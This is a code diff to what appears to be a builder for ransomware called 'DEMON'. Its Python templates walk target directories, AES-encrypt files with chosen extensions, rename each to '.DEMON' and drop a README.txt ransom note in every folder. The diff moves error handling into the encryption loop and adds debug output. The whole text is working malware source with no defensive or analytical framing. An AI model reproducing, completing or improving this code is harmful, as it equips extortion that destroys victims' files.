@@ -55,15 +55,20 @@ def start_encrypt(p, key):
         for x in dirs:
             target = p + x + '/'
             <debug>
-            
+
             for path, subdirs, files in os.walk(target):
                 for name in files:
                     for i in ext:
                         if name.endswith(i.lower()):
                             <debug>
-                            encrypt_file(os.path.join(path, name), key)
-                            <debug>
-                            c +=1
+                            try:
+                                encrypt_file(os.path.join(path, name), key)
+                                c +=1
+                                <debug>
+                            except Exception as e:
+                                <debug>
+                                pass
+
 
                 with open(path + '/README.txt', 'w') as f:
                     f.write(message)
@@ -221,12 +226,9 @@ def encrypt_file(file_name, key):
     with open(file_name, 'rb') as fo:
         plaintext = fo.read()
     enc = encrypt(plaintext, key)
-    try:
-        with open(file_name, 'wb') as fo:
-            fo.write(enc)
-        os.rename(file_name, file_name + '.DEMON')
-    except Exception as e:
-        pass
+    with open(file_name, 'wb') as fo:
+        fo.write(enc)
+    os.rename(file_name, file_name + '.DEMON')
 """
         demon = demon.replace('<import_random>', 'from Crypto import Random')
         demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')
@@ -238,12 +240,10 @@ def encrypt_file(file_name, key):
     with open(file_name, 'rb') as fo:
         plaintext = fo.read()
     enc = aes.encrypt(plaintext)
-    try:
-        with open(file_name, 'wb') as fo:
-            fo.write(enc)
-        os.rename(file_name, file_name + '.DEMON')
-    except Exception as e:
-        pass
+
+    with open(file_name, 'wb') as fo:
+        fo.write(enc)
+    os.rename(file_name, file_name + '.DEMON')
 """
         demon = demon.replace('<import_random>', '')
         demon = demon.replace('<import_aes>', 'import pyaes')
@@ -255,6 +255,7 @@ def encrypt_file(file_name, key):
         demon = demon.replace('<debug>', "print('[SEARCHING] Targeting %s' % target)", 1)
         demon = demon.replace('<debug>', "print('[FOUND] %s' % name)", 1)
         demon = demon.replace('<debug>', "print('[ENCRYPTED] %s' % name)", 1)
+        demon = demon.replace('<debug>', "print('[ERROR] %s' % e)", 1)
         demon = demon.replace('<debug>', "print('[ERROR] %s' % e)", 1)
 
     if fullscreen == 1:
